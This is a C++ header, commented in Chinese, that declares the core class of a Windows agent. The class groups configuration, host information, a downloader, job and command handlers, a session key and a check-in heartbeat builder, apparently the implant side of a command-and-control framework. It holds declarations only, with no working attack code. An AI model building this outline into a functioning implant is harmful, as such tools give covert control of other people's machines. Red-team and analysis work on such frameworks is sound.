// 文件作用：Windows agent 主对象声明：把配置、主机信息、下载器、任务和命令处理器组合在一起。
#pragma once

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "JobsController.h"
#include "MemorySaver.h"
#include "Commander.h"

class Commander;

// Agent 是 Windows 端的核心对象，统一持有配置、主机信息、通信、任务和命令处理器。
class Agent
{
public:
	AgentInfo*      info        = NULL;
	AgentConfig*    config      = NULL;
	Commander*      commander   = NULL;
	Downloader*     downloader  = NULL;
	JobsController* jober       = NULL;
	MemorySaver*    memorysaver = NULL;

	Map<CHAR*, LPVOID> Values;

	BYTE* SessionKey = NULL;
	BOOL  Active     = TRUE;

	// 构造 Agent 并初始化所有子模块。
	Agent();

	// 判断主循环是否继续运行。
	BOOL  IsActive();
	// 计算当前轮询应该 sleep 多久。
	ULONG GetWorkingSleep();
	// 生成 check-in 心跳包。
	BYTE* BuildBeat(ULONG* size);

	// 使用自定义内存分配创建 Agent。
	static void* operator new(size_t sz);
	// 使用自定义内存释放 Agent。
	static void operator delete(void* p) noexcept;
};
